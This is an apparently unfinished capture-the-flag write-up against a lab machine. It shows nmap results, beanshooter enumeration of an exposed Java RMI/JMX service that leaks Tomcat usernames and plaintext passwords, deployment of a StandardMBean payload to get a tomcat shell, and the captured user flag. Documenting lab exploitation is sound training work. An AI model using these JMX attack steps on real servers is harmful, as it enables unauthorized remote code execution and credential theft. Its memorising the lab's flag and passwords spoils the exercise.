#### nmap
3 ports open 
22ssh, 2222 java-rmi, 8080 tomcat apache 10.1.19

##### java-rmi enum
`java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222`
```
[+] 	- Listing 2 tomcat users:
[+]
[+] 		----------------------------------------
[+] 		Username:  manager
[+] 		Password:  fhErvo2r9wuTEYiYgt
[+] 		Roles:
[+] 			   Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+] 		----------------------------------------
[+] 		Username:  admin
[+] 		Password:  onyRPCkaG4iX72BrRtKgbszd
[+] 		Roles:
[+] 			   Users:type=Role,rolename="role1",database=UserDatabase
```

```
└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+] 	Deplyoing MBean: StandardMBean
[+] 	MBean with object name de.qtc.beanshooter:standard=34815959975263 was successfully deployed.
[+]
[+] 	Caught NullPointerException while invoking the newTransformer action.
[+] 	This is expected bahavior and the attack most likely worked :)
[+]
[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=34815959975263 from the MBeanServer.
[+] 	MBean was successfully removed.
                                                                                                    
┌──(maty-work㉿lenovo-x11)-[~/src/beanshooter]
└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222   
[tomcat@10.129.234.57 /]$ 
```

 ```
 [tomcat@10.129.234.57 /opt/tomcat]$ cat user.txt
a86d44c7243b65a9171cf7da3e0bc279
 ```

---
will be added later.
